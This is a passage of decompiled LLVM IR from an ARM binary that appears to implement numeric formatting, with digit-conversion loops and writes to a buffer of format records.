  %v4_15fb8144 = phi i32 [ %v2_15f9c, %bb230 ], [ %v2_15f3c, %dec_label_pc_15f98 ]
  %v2_15fb0 = xor i1 %v9_15fa0, true
  %v3_15fb0 = and i1 %v3_15fa0, %v2_15fb0
  br i1 %v3_15fb0, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_15fa4, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_15fb4 = load i32, i32* @lr, align 4
  %v5_15fb4 = add i32 %v4_15fb4, 1
  store i32 %v5_15fb4, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_15fb0, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_15fb8 = add i32 %v4_15fb8144, 2
  store i32 %v5_15fb8, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15fc0 = load i32, i32* %sb.global-to-local, align 4
  %v7_15fc0 = icmp eq i32 %v0_15fc0, 103
  store i1 %v7_15fc0, i1* %cpsr_z.global-to-local, align 1
  %v3_15fc4 = add i32 %v2_15fc4, 1
  %v4_15fc4 = inttoptr i32 %v3_15fc4 to i8*
  store i8 0, i8* %v4_15fc4, align 1
  %v0_15fc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fc8 = add i32 %v0_15fc8, 1
  store i32 %v1_15fc8, i32* %lr.global-to-local, align 4
  %v0_15fcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fcc, label %dec_label_pc_15fd0, label %dec_label_pc_15ff8

dec_label_pc_15fd0:                               ; preds = %bb236
  %v0_15fd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15fd0 = load i32, i32* %ip.global-to-local, align 4
  %v2_15fd0 = sub i32 %v0_15fd0, %v1_15fd0
  %v4_15fd0 = xor i32 %v1_15fd0, %v0_15fd0
  %v5_15fd0 = xor i32 %v2_15fd0, %v0_15fd0
  %v6_15fd0 = and i32 %v5_15fd0, %v4_15fd0
  %v7_15fd0 = icmp slt i32 %v6_15fd0, 0
  %v8_15fd0 = icmp slt i32 %v2_15fd0, 0
  %v9_15fd0 = icmp eq i32 %v0_15fd0, %v1_15fd0
  %v3_15fd4 = xor i1 %v8_15fd0, %v7_15fd0
  %v4_15fd4 = or i1 %v9_15fd0, %v3_15fd4
  %.258 = zext i1 %v4_15fd4 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_15fdc = add i32 %v0_15fd0, 4
  %v3_15fdc = sub i32 0, %v0_15fd0
  %v4_15fdc = and i32 %v1_15fdc, %v3_15fdc
  %v5_15fdc = icmp slt i32 %v4_15fdc, 0
  %v6_15fdc = icmp slt i32 %v1_15fdc, 0
  %v7_15fdc = icmp eq i32 %v1_15fdc, 0
  store i1 %v7_15fdc, i1* %cpsr_z.global-to-local, align 1
  %v2_15fe0 = xor i1 %v6_15fdc, %v5_15fdc
  br i1 %v2_15fe0, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_15fd0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16314

bb239:                                            ; preds = %dec_label_pc_15fd0
  %v2_15fe4 = icmp eq i1 %v4_15fd4, false
  store i1 %v2_15fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15fe4, label %dec_label_pc_16314, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_15fe8 = sub i32 %v1_15fd0, %v0_15fd0
  store i32 %v3_15fe8, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16004

dec_label_pc_15ff8:                               ; preds = %bb236
  %v0_15ff8 = load i32, i32* %sb.global-to-local, align 4
  %v7_15ff8 = icmp eq i32 %v0_15ff8, 102
  store i1 %v7_15ff8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_15ff8, i32* %r8.global-to-local, align 4
  br i1 %v7_15ff8, label %dec_label_pc_15ff8.dec_label_pc_16004_crit_edge, label %dec_label_pc_16014

dec_label_pc_15ff8.dec_label_pc_16004_crit_edge:  ; preds = %dec_label_pc_15ff8
  %v0_16004.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16004

dec_label_pc_16004:                               ; preds = %.thread24, %dec_label_pc_15ff8.dec_label_pc_16004_crit_edge
  %v0_16004 = phi i32 [ %v0_16004.pre, %dec_label_pc_15ff8.dec_label_pc_16004_crit_edge ], [ %v0_15fd0, %.thread24 ]
  %v1_16004 = icmp slt i32 %v0_16004, 0
  %v2_16004 = icmp eq i32 %v0_16004, 0
  store i1 %v2_16004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16004, label %bb240, label %dec_label_pc_16014

bb240:                                            ; preds = %dec_label_pc_16004
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1600c = load i32, i32* %r2.global-to-local, align 4
  %v6_1600c = add i32 %v5_1600c, -1
  %v7_1600c = inttoptr i32 %v6_1600c to i8*
  store i8 48, i8* %v7_1600c, align 1
  %v8_1600c = load i32, i32* %r2.global-to-local, align 4
  %v9_1600c = add i32 %v8_1600c, -1
  store i32 %v9_1600c, i32* %r2.global-to-local, align 4
  %v0_16010.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16044.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16014

dec_label_pc_16014:                               ; preds = %bb240, %dec_label_pc_16004, %dec_label_pc_16314, %dec_label_pc_15ff8
  %v1_16044 = phi i32 [ %v1_15fc8, %dec_label_pc_15ff8 ], [ %v1_15fc8, %dec_label_pc_16314 ], [ %v1_16044.pre.pre, %bb240 ], [ %v1_15fc8, %dec_label_pc_16004 ]
  %v1_160bc30 = phi i32 [ 0, %dec_label_pc_15ff8 ], [ 0, %dec_label_pc_16314 ], [ %v0_16010.pre, %bb240 ], [ %v0_16004, %dec_label_pc_16004 ]
  store i32 %v1_160bc30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_16020 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_16020, i32* %r3.global-to-local, align 4
  %v0_1602c = load i32, i32* %r2.global-to-local, align 4
  %v1_1602c = inttoptr i32 %v0_1602c to i8*
  %v2_1602c = load i8, i8* %v1_1602c, align 1
  %v3_1602c = zext i8 %v2_1602c to i32
  store i32 %v3_1602c, i32* %r3.global-to-local, align 4
  %v5_1602c = add i32 %v0_1602c, 1
  store i32 %v5_1602c, i32* %r2.global-to-local, align 4
  %v1_16030 = icmp slt i32 %v1_160bc30, 0
  %v2_16030 = icmp eq i32 %v1_160bc30, 0
  store i1 %v2_16030, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_1602c, i32* %r6.global-to-local, align 4
  store i32 %v3_1602c, i32* %stack_var_-42, align 4
  %v2_16044 = sub i32 %v1_16044, %v5_1602c
  store i32 %v2_16044, i32* %ip.global-to-local, align 4
  br i1 %v1_16030, label %.thread, label %dec_label_pc_16050

.thread:                                          ; preds = %dec_label_pc_16014
  %v5_16048 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_16048, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_160cc

dec_label_pc_16050:                               ; preds = %dec_label_pc_16014
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16054 = sub i32 %v1_160bc30, %v2_16044
  %v4_16054 = xor i32 %v2_16044, %v1_160bc30
  %v5_16054 = xor i32 %v2_16054, %v1_160bc30
  %v6_16054 = and i32 %v5_16054, %v4_16054
  %v7_16054 = icmp slt i32 %v6_16054, 0
  %v8_16054 = icmp slt i32 %v2_16054, 0
  %v9_16054 = icmp eq i32 %v1_160bc30, %v2_16044
  store i1 %v9_16054, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_16060 = xor i1 %v8_16054, %v7_16054
  br i1 %v2_16060, label %dec_label_pc_160ac, label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_16050
  store i32 %v2_16054, i32* %r2.global-to-local, align 4
  %v2_16068 = icmp eq i32 %v2_16054, 0
  store i1 %v2_16068, i1* %cpsr_z.global-to-local, align 1
  %v2_1606c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1606c, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_16054, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_16080

.thread148:                                       ; preds = %dec_label_pc_16064
  %v7_16074 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_16074, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_16080:                               ; preds = %dec_label_pc_16064
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33957), i32* %r3.global-to-local, align 4
  %v2_16090 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_16090, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_160cc

dec_label_pc_160ac:                               ; preds = %dec_label_pc_16050
  store i1 %v2_16030, i1* %cpsr_z.global-to-local, align 1
  %v2_160b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_160b0, i32* %lr.global-to-local, align 4
  br i1 %v2_16030, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_160ac
  %v3_160b8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_160b8, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_160ac
  %v3_160bc = sub i32 %v2_16044, %v1_160bc30
  store i32 %v3_160bc, i32* %ip.global-to-local, align 4
  %v3_160c063 = add i32 %v5_1602c, %v1_160bc30
  store i32 %v3_160c063, i32* %r6.global-to-local, align 4
  %v3_160c4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_160c4, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1610c265 = phi i32 [ %v3_160b8, %bb242 ], [ %v3_160c4, %bb243 ], [ %v7_16074, %.thread148 ]
  %v0_160e0102 = phi i32 [ %v2_16044, %bb242 ], [ %v3_160bc, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_160cc

dec_label_pc_160cc:                               ; preds = %.thread, %dec_label_pc_16080, %.thread34
  %v1_1610c = phi i32 [ %v2_16090, %dec_label_pc_16080 ], [ %v1_1610c265, %.thread34 ], [ %v5_16048, %.thread ]
  %v0_16120109 = phi i32 [ -1, %dec_label_pc_16080 ], [ -1, %.thread34 ], [ %v1_160bc30, %.thread ]
  %v0_160e0 = phi i32 [ 0, %dec_label_pc_16080 ], [ %v0_160e0102, %.thread34 ], [ %v2_16044, %.thread ]
  %v3_160cc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_160cc, i32* %r2.global-to-local, align 4
  %v1_160d0 = add i32 %v3_160cc, 12
  %v2_160d0 = inttoptr i32 %v1_160d0 to i32*
  %v3_160d0 = load i32, i32* %v2_160d0, align 4
  %v1_160d4 = and i32 %v3_160d0, 16
  store i32 %v1_160d4, i32* %r4.global-to-local, align 4
  %v2_160d4 = icmp eq i32 %v1_160d4, 0
  %tmp270 = zext i1 %v2_160d4 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_160e0 = icmp eq i32 %v0_160e0, 0
  store i1 %v2_160e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160e0, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_160cc
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_160fc

bb246:                                            ; preds = %dec_label_pc_160cc
  store i1 %v2_160d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160d4, label %dec_label_pc_160f0, label %dec_label_pc_160fc

dec_label_pc_160f0:                               ; preds = %bb246
  %v0_160f0 = load i32, i32* %sb.global-to-local, align 4
  %v7_160f0 = icmp eq i32 %v0_160f0, 103
  store i1 %v7_160f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_160f0, label %dec_label_pc_16120, label %bb247

bb247:                                            ; preds = %dec_label_pc_160f0
  %v1_160f4 = load i32, i32* %fp.global-to-local, align 4
  %v3_160f4 = icmp eq i32 %v1_160f4, 0
  store i1 %v3_160f4, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_160f4, 1
  br i1 %tmp248, label %dec_label_pc_16120, label %dec_label_pc_160fc

dec_label_pc_160fc:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33960), i32* %r3.global-to-local, align 4
  %v2_1610c = inttoptr i32 %v1_1610c to i32*
  store i32 112, i32* %v2_1610c, align 4
  %v0_16110 = load i32, i32* %r3.global-to-local, align 4
  %v1_16110 = add i32 %v0_16110, 16
  store i32 %v1_16110, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_16118 = load i32, i32* %r7.global-to-local, align 4
  %v1_16118 = add i32 %v0_16118, 4
  %v2_16118 = inttoptr i32 %v1_16118 to i32*
  store i32 1, i32* %v2_16118, align 4
  %v4_16118 = add i32 %v0_16118, 8
  %v5_16118 = inttoptr i32 %v4_16118 to i32*
  %v6_16118 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16118, i32* %v5_16118, align 4
  %v0_1611c = load i32, i32* %r7.global-to-local, align 4
  %v1_1611c = add i32 %v0_1611c, 12
  store i32 %v1_1611c, i32* %r7.global-to-local, align 4
  %v0_16120.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16120

dec_label_pc_16120:                               ; preds = %dec_label_pc_160f0, %bb247, %dec_label_pc_160fc
  %v1_16140 = phi i32 [ %v1_1610c, %bb247 ], [ %v1_1611c, %dec_label_pc_160fc ], [ %v1_1610c, %dec_label_pc_160f0 ]
  %v0_16120 = phi i32 [ %v0_16120109, %bb247 ], [ %v0_16120.pre, %dec_label_pc_160fc ], [ %v0_16120109, %dec_label_pc_160f0 ]
  %v1_16120 = add i32 %v0_16120, 1
  store i32 %v1_16120, i32* %lr.global-to-local, align 4
  %v6_16120 = icmp slt i32 %v1_16120, 0
  %v7_16120 = icmp eq i32 %v1_16120, 0
  store i1 %v7_16120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_16120, label %dec_label_pc_16128, label %dec_label_pc_1614c

dec_label_pc_16128:                               ; preds = %dec_label_pc_16120
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33957), i32* %r3.global-to-local, align 4
  %v1_16138 = sub i32 -1, %v0_16120
  store i32 %v1_16138, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16140 = inttoptr i32 %v1_16140 to i32*
  store i32 176, i32* %v2_16140, align 4
  %v0_16144 = load i32, i32* %r7.global-to-local, align 4
  %v1_16144 = add i32 %v0_16144, 4
  %v2_16144 = inttoptr i32 %v1_16144 to i32*
  %v3_16144 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_16144, i32* %v2_16144, align 4
  %v4_16144 = add i32 %v0_16144, 8
  %v5_16144 = inttoptr i32 %v4_16144 to i32*
  %v6_16144 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16144, i32* %v5_16144, align 4
  %v0_16148 = load i32, i32* %r7.global-to-local, align 4
  %v1_16148 = add i32 %v0_16148, 12
  store i32 %v1_16148, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1614c

dec_label_pc_1614c:                               ; preds = %dec_label_pc_16120, %dec_label_pc_16128
  %v2_16154 = phi i32 [ %v1_16140, %dec_label_pc_16120 ], [ %v1_16148, %dec_label_pc_16128 ]
  %v0_1614c = load i32, i32* %ip.global-to-local, align 4
  %v2_1614c = icmp eq i32 %v0_1614c, 0
  store i1 %v2_1614c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1614c, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1614c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_16154 = inttoptr i32 %v2_16154 to i32*
  store i32 112, i32* %v3_16154, align 4
  %v1_16158 = load i32, i32* %r6.global-to-local, align 4
  %v2_16158 = load i32, i32* %r7.global-to-local, align 4
  %v3_16158 = add i32 %v2_16158, 8
  %v4_16158 = inttoptr i32 %v3_16158 to i32*
  store i32 %v1_16158, i32* %v4_16158, align 4
  %v1_1615c = load i32, i32* %ip.global-to-local, align 4
  %v2_1615c = load i32, i32* %r7.global-to-local, align 4
  %v3_1615c = add i32 %v2_1615c, 4
  %v4_1615c = inttoptr i32 %v3_1615c to i32*
  store i32 %v1_1615c, i32* %v4_1615c, align 4
  %v1_16160 = load i32, i32* %r7.global-to-local, align 4
  %v2_16160 = add i32 %v1_16160, 12
  store i32 %v2_16160, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1614c, %bb249
  %v1_16198 = phi i32 [ %v2_16154, %dec_label_pc_1614c ], [ %v2_16160, %bb249 ]
  %v0_16164 = load i32, i32* %sb.global-to-local, align 4
  %v7_16164 = icmp eq i32 %v0_16164, 103
  store i1 %v7_16164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16164, label %dec_label_pc_1616c, label %dec_label_pc_16174

dec_label_pc_1616c:                               ; preds = %.thread46
  %v0_1616c = load i32, i32* %r4.global-to-local, align 4
  %v2_1616c = icmp eq i32 %v0_1616c, 0
  store i1 %v2_1616c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1616c, label %dec_label_pc_161a4, label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %.thread46, %dec_label_pc_1616c
  %v0_16174 = load i32, i32* %lr.global-to-local, align 4
  %v1_16174 = load i32, i32* %ip.global-to-local, align 4
  %v2_16174 = sub i32 %v1_16174, %v0_16174
  store i32 %v2_16174, i32* %r1.global-to-local, align 4
  %v1_16178 = load i32, i32* %fp.global-to-local, align 4
  %v2_16178 = sub i32 %v2_16174, %v1_16178
  %v4_16178 = xor i32 %v1_16178, %v2_16174
  %v5_16178 = xor i32 %v2_16178, %v2_16174
  %v6_16178 = and i32 %v5_16178, %v4_16178
  %v7_16178 = icmp slt i32 %v6_16178, 0
  %v8_16178 = icmp slt i32 %v2_16178, 0
  %v9_16178 = icmp eq i32 %v2_16174, %v1_16178
  store i1 %v9_16178, i1* %cpsr_z.global-to-local, align 1
  %v2_1617c = xor i1 %v8_16178, %v7_16178
  br i1 %v2_1617c, label %dec_label_pc_16180, label %dec_label_pc_161a4

dec_label_pc_16180:                               ; preds = %dec_label_pc_16174
  %v2_1618c = sub i32 %v1_16178, %v2_16174
  store i32 %v2_1618c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33957), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16198 = inttoptr i32 %v1_16198 to i32*
  store i32 176, i32* %v2_16198, align 4
  %v0_1619c = load i32, i32* %r7.global-to-local, align 4
  %v1_1619c = add i32 %v0_1619c, 4
  %v2_1619c = inttoptr i32 %v1_1619c to i32*
  %v3_1619c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1619c, i32* %v2_1619c, align 4
  %v4_1619c = add i32 %v0_1619c, 8
  %v5_1619c = inttoptr i32 %v4_1619c to i32*
  %v6_1619c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1619c, i32* %v5_1619c, align 4
  %v0_161a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_161a0 = add i32 %v0_161a0, 12
  store i32 %v1_161a0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_161a4

dec_label_pc_161a4:                               ; preds = %dec_label_pc_16174, %dec_label_pc_1616c, %dec_label_pc_16180
  %v1_16238.pre.pre = phi i32 [ %v1_16198, %dec_label_pc_16174 ], [ %v1_16198, %dec_label_pc_1616c ], [ %v1_161a0, %dec_label_pc_16180 ]
  %v0_161a4 = load i32, i32* %r8.global-to-local, align 4
  %v7_161a4 = icmp eq i32 %v0_161a4, 102
  store i1 %v7_161a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_161a4, label %dec_label_pc_1622c, label %dec_label_pc_161ac

dec_label_pc_161ac:                               ; preds = %dec_label_pc_161a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_161b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_161b0 = icmp slt i32 %v0_161b0, 0
  %v2_161b0 = icmp eq i32 %v0_161b0, 0
  store i1 %v2_161b0, i1* %cpsr_z.global-to-local, align 1
  %v4_161b4 = select i1 %tmp275, i32 %v4_15ed0126130, i32 101
  store i32 %v4_161b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_161c4 = sub i32 0, %v0_161b0
  %storemerge158 = select i1 %v1_161b0, i32 %v4_161c4, i32 %v0_161b0
  %tmp271 = ashr i32 %v0_161b0, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_161cc = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_161cc, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %dec_label_pc_16204, %dec_label_pc_161d4, %dec_label_pc_161ac
  %v2_161ec = phi i32 [ %v2_161cc, %dec_label_pc_161ac ], [ %v6_161ec, %dec_label_pc_161d4 ], [ %v6_161ec, %dec_label_pc_16204 ]
  %v0_161e4 = phi i32 [ %storemerge158, %dec_label_pc_161ac ], [ %v2_161f0, %dec_label_pc_161d4 ], [ %v2_161f0, %dec_label_pc_16204 ]
  %v3_161dc = urem i32 %v0_161e4, 10
  %v1_161e0 = or i32 %v3_161dc, 48
  store i32 %v1_161e0, i32* %r3.global-to-local, align 4
  store i32 %v0_161e4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_161ec = trunc i32 %v1_161e0 to i8
  %v3_161ec = add i32 %v2_161ec, -1
  %v4_161ec = inttoptr i32 %v3_161ec to i8*
  store i8 %v1_161ec, i8* %v4_161ec, align 1
  %v5_161ec = load i32, i32* %r6.global-to-local, align 4
  %v6_161ec = add i32 %v5_161ec, -1
  store i32 %v6_161ec, i32* %r6.global-to-local, align 4
  %v0_161f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_161f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_161f0 = sdiv i32 %v0_161f0, %v1_161f0
  store i32 %v2_161f0, i32* %r0.global-to-local, align 4
  %v0_161f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_161f4 = add i32 %v0_161f4, 1
  store i32 %v1_161f4, i32* %r8.global-to-local, align 4
  %v7_161f8 = icmp eq i32 %v1_161f4, 3
  store i1 %v7_161f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_161f0, i32* %r5.global-to-local, align 4
  br i1 %v7_161f8, label %dec_label_pc_161d4, label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %dec_label_pc_161d4
  %v2_16204 = icmp eq i32 %v2_161f0, 0
  store i1 %v2_16204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16204, label %dec_label_pc_1620c, label %dec_label_pc_161d4

dec_label_pc_1620c:                               ; preds = %dec_label_pc_16204
  %v1_1620c = add i32 %v5_161ec, -2
  store i32 %v1_1620c, i32* %r3.global-to-local, align 4
  %v0_16210 = load i32, i32* %sl.global-to-local, align 4
  %v1_16210 = trunc i32 %v0_16210 to i8
  %v4_16210 = inttoptr i32 %v1_1620c to i8*
  store i8 %v1_16210, i8* %v4_16210, align 1
  %v0_16214 = load i32, i32* %r3.global-to-local, align 4
  %v1_16214 = add i32 %v0_16214, -1
  store i32 %v1_16214, i32* %r2.global-to-local, align 4
  %v0_16218 = load i32, i32* %r4.global-to-local, align 4
  %v1_16218 = trunc i32 %v0_16218 to i8
  %v4_16218 = inttoptr i32 %v1_16214 to i8*
  store i8 %v1_16218, i8* %v4_16218, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_16220 = load i32, i32* %r7.global-to-local, align 4
  %v1_16220 = inttoptr i32 %v0_16220 to i32*
  store i32 112, i32* %v1_16220, align 4
  %v3_16220 = add i32 %v0_16220, 4
  %v4_16220 = inttoptr i32 %v3_16220 to i32*
  %v5_16220 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_16220, i32* %v4_16220, align 4
  %v0_16224 = load i32, i32* %r2.global-to-local, align 4
  %v1_16224 = load i32, i32* %r7.global-to-local, align 4
  %v2_16224 = add i32 %v1_16224, 8
  %v3_16224 = inttoptr i32 %v2_16224 to i32*
  store i32 %v0_16224, i32* %v3_16224, align 4
  %v0_16228 = load i32, i32* %r7.global-to-local, align 4
  %v1_16228 = add i32 %v0_16228, 12
  store i32 %v1_16228, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %dec_label_pc_161a4, %.thread124, %dec_label_pc_1620c
  %v1_16238.pre = phi i32 [ %v2_15d04, %.thread124 ], [ %v1_16228, %dec_label_pc_1620c ], [ %v1_16238.pre.pre, %dec_label_pc_161a4 ]
  %v2_1622c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1622c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16230

dec_label_pc_16230:                               ; preds = %dec_label_pc_16230, %dec_label_pc_1622c
  %v0_16230 = phi i32 [ %v2_1622c, %dec_label_pc_1622c ], [ %v4_16230, %dec_label_pc_16230 ]
  %stack_var_-188.0 = phi i32 [ %v3_15ba0, %dec_label_pc_1622c ], [ %v2_1623c, %dec_label_pc_16230 ]
  %v1_16230 = inttoptr i32 %v0_16230 to i32*
  %v2_16230 = load i32, i32* %v1_16230, align 4
  store i32 %v2_16230, i32* %r3.global-to-local, align 4
  %v4_16230 = add i32 %v0_16230, 12
  store i32 %v4_16230, i32* %r2.global-to-local, align 4
  %v3_16238 = icmp ult i32 %v4_16230, %v1_16238.pre
  %v2_1623c = sub i32 %stack_var_-188.0, %v2_16230
  store i32 %v2_1623c, i32* %ip.global-to-local, align 4
  br i1 %v3_16238, label %dec_label_pc_16230, label %dec_label_pc_16248

dec_label_pc_16248:                               ; preds = %dec_label_pc_16230
  %v3_16248 = load i8, i8* %stack_var_-46, align 1
  %v4_16248 = sext i8 %v3_16248 to i32
  store i32 %v4_16248, i32* %r3.global-to-local, align 4
  store i32 %v4_16248, i32* %r2.global-to-local, align 4
  %v2_1624c = icmp eq i8 %v3_16248, 0
  store i1 %v2_1624c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1624c, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_16248
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_16248, %bb253
  %v1_162ac = phi i32 [ %v4_16248, %dec_label_pc_16248 ], [ 1, %bb253 ]
  %v2_16254 = sub i32 %v2_1623c, %v1_162ac
  store i32 %v2_16254, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1625c = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1625c, i32* %r3.global-to-local, align 4
  %v2_16260 = icmp eq i32 %v2_16254, 0
  store i1 %v2_16260, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_16254, 1
  br i1 %tmp255, label %dec_label_pc_162c8, label %dec_label_pc_16274

dec_label_pc_16274:                               ; preds = %bb254
  %v3_16274 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16274, i32* %lr.global-to-local, align 4
  %v1_16278 = add i32 %v3_16274, 12
  %v2_16278 = inttoptr i32 %v1_16278 to i32*
  %v3_16278 = load i32, i32* %v2_16278, align 4
  store i32 %v3_16278, i32* %r3.global-to-local, align 4
  %v1_1627c = and i32 %v3_16278, 8
  %v2_1627c = icmp eq i32 %v1_1627c, 0
  store i1 %v2_1627c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1627c, label %dec_label_pc_162a0, label %dec_label_pc_16284

dec_label_pc_16284:                               ; preds = %dec_label_pc_16274
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33957), i32* %r3.global-to-local, align 4
  %v1_16294 = add i32 %v1_16238.pre, 12
  store i32 %v1_16294, i32* %r6.global-to-local, align 4
  %v1_16298 = inttoptr i32 %v1_16238.pre to i32*
  store i32 160, i32* %v1_16298, align 4
  %v3_16298 = add i32 %v1_16238.pre, 4
  %v4_16298 = inttoptr i32 %v3_16298 to i32*
  %v5_16298 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16298, i32* %v4_16298, align 4
